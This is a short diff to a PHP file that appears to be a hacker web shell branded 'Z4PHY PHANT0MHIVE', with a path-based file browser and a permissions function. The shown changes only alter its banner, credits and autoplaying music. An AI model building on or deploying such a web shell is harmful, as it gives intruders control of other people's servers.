@@ -122,13 +122,9 @@ text-align: left;
 <br>
 <font face="Kelly Slab" color="white" size="7px">WELCOME TO $ .: Z4PHY PHANT0MHIVE :. $</font><br>
 </h1></center>
-<center><b><font face="courier new" color="white" size="5">$ .: Z4PHY PHANT0MHIVE :. $</font></b></center>
-<marquee><b><fonte face="courier new" color="white" size="4">Cowok Tersakiti Team - JawaBaratCyber - And All My Friend</font></b></marquee>
-<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
 <table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
 <tr><td>';
 echo "<tr><td><font color='white'>
-+ Coded By   <td>: <font color='LightBlue'>Z4PHY C0DE<tr><td><font color='white'>
 </table>";
 echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
 <center><tr align="center"><td align="center">path : ';
@@ -448,7 +444,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Zildan</center>
+echo '<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
 </body>
 </html>';
 function perms($file){
